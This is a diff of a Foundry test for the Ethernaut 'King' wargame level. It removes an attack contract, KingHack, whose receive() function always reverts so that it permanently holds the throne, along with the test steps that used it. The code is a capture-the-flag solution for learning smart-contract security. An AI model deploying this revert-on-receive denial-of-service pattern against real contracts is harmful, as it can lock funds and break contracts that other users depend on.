@@ -29,19 +29,7 @@ contract KingTest is Test {
         /****************
          *    Attack     *
          *************** */
-        KingHack kingHack = new KingHack(payable(levelAddress));
-        address initialKing = ethernautKing._king();
-        /* In the hack contract, in attack function, we need to pass a msg.value
-         * calling the receive of the base contract
-         * In order to claim ownership, we either need a value >= prize or be the owner
-         * When calling the attack function you should see a log with a reverted transaction
-         * It's normal because of the way the initial contract is designed
-         * Once the fallback is called and condition met, the actual king transfer back the msg.value to the msg.sender
-         */
-        kingHack.attack{value: 1 ether}();
-        address afterKing = ethernautKing._king();
-        assertTrue(initialKing != afterKing);
-        assertEq(address(kingHack), afterKing);
+
         /*****************
          *Level Submission*
          ***************  */
@@ -50,24 +38,5 @@ contract KingTest is Test {
         );
         vm.stopPrank();
         assert(levelSuccessfullyPassed);
-    }
-}
-
-contract KingHack {
-    King public challenge;
-
-    constructor(address challengeAddress) {
-        challenge = King(payable(challengeAddress));
-    }
-
-    function attack() external payable {
-        (bool success, ) = payable(address(challenge)).call{value: msg.value}(
-            ""
-        );
-        require(success, "Call failed");
-    }
-
-    receive() external payable {
-        require(false, "Can's steal my throne bro!");
     }
 }
